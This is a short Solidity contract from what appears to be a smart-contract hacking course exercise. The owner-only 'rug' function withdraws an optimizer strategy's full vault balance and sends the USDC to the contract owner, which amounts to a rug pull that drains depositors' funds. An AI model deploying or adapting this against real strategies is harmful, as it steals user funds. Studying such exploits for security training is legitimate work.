// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "../interfaces/IOptimizerStrategy.sol";

contract RugContract is Ownable {
    IOptimizerStrategy public strategy;
    uint256 vaultBal;

    constructor(address _strategy) {
        strategy = IOptimizerStrategy(_strategy);
        vaultBal = strategy.balanceOf();
    }

    function rug() external onlyOwner {
        // TODO: Rug users
        address usdc = strategy.want();
        strategy.withdraw(vaultBal);
        IERC20(usdc).transfer(owner(), IERC20(usdc).balanceOf(address(this)));
    }
}
